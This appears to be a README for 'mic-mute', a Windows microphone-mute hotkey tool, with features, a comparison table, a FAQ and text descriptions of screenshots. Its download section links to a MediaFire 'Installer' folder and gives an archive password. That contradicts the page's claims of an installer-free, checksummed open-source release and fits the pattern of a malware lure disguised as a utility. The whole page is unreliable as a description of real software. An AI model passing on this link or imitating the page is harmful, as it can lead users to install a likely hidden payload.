# mic-mute

🎙️ Free, open-source global mic mute for Windows — one hotkey silences every app, per-device, with a tray indicator. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **System-wide mute hotkey** — Ctrl+Alt+M mutes the default capture device in Discord, Zoom, Teams and OBS at once
- ✅ **Push-to-talk mode** — hold the hotkey to unmute instead of toggling, for calls where open mic is not allowed
- ✅ **Per-device targeting** — pick the exact microphone when several are connected; hotkey applies only to it
- ✅ **Level meter** — live input bars show whether the app is actually hearing you after mute
- ✅ **Tray state icon** — red slash when muted, green waveform when live; no overlay window in the way
- ✅ **No driver, no rerouting** — uses Core Audio endpoint control; apps see a normal muted device
- ✅ **100 MB self-contained exe** — runtime bundled, no installer, offline, MIT with CI-built SHA-256 releases

## Why mic-mute

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **mic-mute** | MicMute | TinyMute | Sound Settings |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Built-in |
| Open source | **Yes** | No | No | No |
| Global hotkey | **Yes** | Yes | Yes | No |
| Push-to-talk mode | **Yes** | No | Yes | No |
| Per-device targeting | **Yes** | Partial | No | Manual |
| Level meter and tray state | **Yes** | Tray only | No | No |

## FAQ

**how to mute microphone with a keyboard shortcut in Windows?**

Windows still has no global mic mute switch, so mute lives three clicks deep in Sound settings — mic-mute binds it to one hotkey that works from any app. It controls the real capture endpoint through Core Audio, so every meeting app sees the standard mute state and nothing is spoofed. It is a 100 MB portable exe, offline, MIT, no account and no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark tray-first window (charcoal #14161A, red/green #F87171/#34D399): device dropdown, giant MUTE/UNMUTE button, live input bars, hotkey chip Ctrl+Alt+M.
2. Push-to-talk panel: hold-time meter, bound key capture field, per-app compatibility list with checkmarks, muted-state preview.
3. Settings: startup toggle off, device priority order, tray icon style picker, log showing Muted default mic at 14:32:07.

## Download

| Source | Link |
|---|---|
| 💾 **Installer mic-mute** | [Installer mic-mute](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).